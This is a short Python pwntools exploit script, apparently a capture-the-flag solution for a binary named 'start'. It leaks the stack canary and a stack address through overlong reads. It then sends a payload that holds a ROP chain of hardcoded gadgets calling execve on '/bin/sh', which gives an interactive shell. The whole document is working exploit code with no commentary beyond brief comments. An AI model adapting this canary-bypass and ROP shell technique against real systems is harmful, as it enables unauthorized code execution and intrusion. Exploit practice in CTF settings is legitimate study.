from pwn import *
import time

r = process('./start')
context.arch = 'amd64'

syscall = 0x0000000000468e75# : syscall ; ret
prdi = 0x00000000004005d5# : pop rdi ; ret
prsi = 0x00000000004017f7# : pop rsi ; ret
gadget = 0x000000000047a6e6# : pop rax ; pop rdx ; pop rbx ; ret

def packAll(rop):
    return flat([p64(x) for x in rop])

# leak canary
r.send('A'*0x19)
r.recvuntil('A'*0x19)
canary = '\x00'+r.recv(7)
r.clean()

# leak stack
r.send('A'*0x40)
r.recv(0x40)
buf = u64(r.recv(6)+'\x00\x00') - 0x158
print hex(buf-0x158)

# rop
rop = []
rop += [gadget, 0x3b, 0, 0]
rop += [prdi, buf+8]
rop += [prsi, 0]
rop += [syscall]

payload = 'A'*0x8+'/bin/sh\x00'+'A'*0x8+canary+'A'*0x8+packAll(rop)
r.send(payload)

r.sendline('exit')


r.interactive()
